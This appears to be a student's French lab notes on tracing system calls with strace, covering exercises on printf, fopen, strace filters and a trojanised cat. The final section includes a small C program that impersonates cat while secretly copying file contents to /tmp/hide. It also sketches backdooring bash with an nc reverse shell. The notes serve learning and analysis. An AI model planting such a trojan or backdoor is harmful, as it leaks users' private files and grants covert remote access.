# Notes - TP1

Lancer la vm :

```shell
$ qemu-system-x86_64 strace.img
```

## Exercice A

La sortie de strace est très fournie pour un programme qui est vide. Le programme effectue 11 appels systèmes rien que pour être lancé, puis retourner son code de retour.

## Exercice B-C

L'appel dela fonction `printf` appelle 6 primitives supplémentaires :

- `ftstat64` : Permet d'obtenir des informations sur un descripteur de fichier, en l'occurence 1, la sortie standard.
- `ioctl`: Permet d'obtenir des information sur un périphérique. En l'occurence, TCGETS permet d'optenir les paramètres du terminal (signaux, vitesse de transmission etc...)
- `brk(NULL)`: Permet d'obtenir la position actuelle du pointeur dans le heap pour connaitre sa taille.
- `brk(0x18c0000)` : Permet d'agrandir la zone mémoire heap, sans doute pour accueillir la chaine de caractères "Hello world".
- `brk(0x18c1000)` : Permet d'agrandir encore la zone mémoire heap.
- `write` : Écrit dans la sortie standard notre chaine de caractères "Hello world".

Les 10 premiers appels quand à eux, restent similaires, excepté les adresses mémoires qui peuvent être différentes.

## Exercice D

Tout le début du programme, jusqu'au premier `fopen` n'appelle pas de primitives systèmes. On aurait pu penser que l'empillement des paramètres au lancement du programme fasse appeler des primitives systèmes, mais je pense que `strace` n'affiche que celles appellées par le programme, et non celles appellées par le système.

Ensuite, on a la primitive `openat` qui correspond à `  input = fopen(argv[1], "r");`. Elle retourne 3, ce qui signifie que le descripteur de fichier de `albatros.txt` sera le numéro 3.

De manière similaire, `openat` est appelé pour `  output = fopen(outputname, "w");`. Le fichier `monalbatros.txt` prendra le numéro .

Comme dans la question précédente, `printf` déclanche 3 primitives : `fstat` pour obtinir des information sur la sortie standart, `ioctl` pour obtenir des information sur le terminal, et `write` pour écrire dans le terminal. 

Ensuite, `fgetc` appelle `fstat` pour avoir des information sur le descripteur de fichier 3 (`albatros.txt`) puis `read` pour récupérer son contenu.

Pour finir, `fprintf` appelle la primitive `write` qui va écrire dans le descripteur de fichier 4 (`monalbatros.txt`).

## Exercice E

A en juger par les nombreux appels à `stat64` cherchant `start` dans tout les chemins de commande, je pense qu'il sagit de l'appel à `which start`

## Exercice F

`strace find /etc/default` renvoie tout les appels systèmes de la commande `find /ect/default`

`strace -c find /etc/default` permet d'avoir un tableau résumé de tout les appels aux différentes primitives, et leurs occurences.

`strace -e trace=file find /etc/default` permet d'appliquer un filtre n'affichant que les appels systèmes relatif aux fichiers, par exemple : `openat`, `access` ou `fstatat64`.

`strace -e trace=open,close,read,write find /etc/default` de manière similaire permet d'appliquer un filtre pour ne voir que les primivite `open`, `close`, `read` et `write`.

## Exercice G

L'option `-f` semble permettre de suivre les appels systèmes de tout les processus enfants du programme initial. Chaque processus est distingué des autres par son pid en début de ligne.

## Exercice H

Ce programme semble dans le fichier indiqué en premier argument ce qu'on a renseigné dans le second. Il rajoute un saut de ligne à la fin. Il n'écrase pas le fichier si il existe déjà.

## Exercice I

Mon secret est normalement secret, car moi seul peut le lire. Normalement, j'accorderai une confiance totale en la commande `cat`.

La commande cat écrit aussi le résultat dans le fichier `/dev/shm/out`.

D'autres méthodes permettent d'afficher le contenu des fichiers. `less`, `nano` .

Le fichier `/dev/shm/out` étant public, tout le monde peut lire mon secret. De la même manière, je pourrais lire les secrets des autres utilisateurs.

D'après les trace le cheval de troie à sans doute été écrit en `C` en créant un enfant pour simuler la commande `cat` deux fois, en écrivant dans un fichier défini à l'avance, et dans la sortie standard. Pour l'installation, si l'attaquant était root, c'était plutôt facile, il suffisait de remplacer le fichier `/bin/cat` par son programme. 

## Synthèse 

Les principaux types d'appels systèmes sont :

1. Gestion des fichiers : read, open, write, etc...
2. Gestion de la mémoire : malloc, free, mmap, etc...
3. Gestion des processus : fork, exec, wait, etc...

Dans une analyse boite noire, les plus pertinent sont la gestion des fichiers, ça permet de voir ce qui rentre et sort du programme et ainsi de comprendre son fonctionnement. 

Comme dans l'exercice précédent, un programme `c` qui reproduit le commportment de la commande `cat` mais qui copie le contenu du fichier peut remplacer la commande `cat` originale. Par exemple :

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
		FILE *fichier;
		FILE *secret;
		char c;

		fichier = fopen(argv[1], "r");
		secret = fopen("/tmp/hide", "w");

		while ((c = fgetc(fichier)) != EOF)
		{
				printf("%c", c);
				fputc(c, secret);
		}

		fclose(fichier);
  	fclose(secret);

		return 0;
}
```

De manière similaire, pour un reverse shell, on pourrait modifier la commande "bash" pour inclure un processus qui, à travers `nc` permettrait la connection à distance.
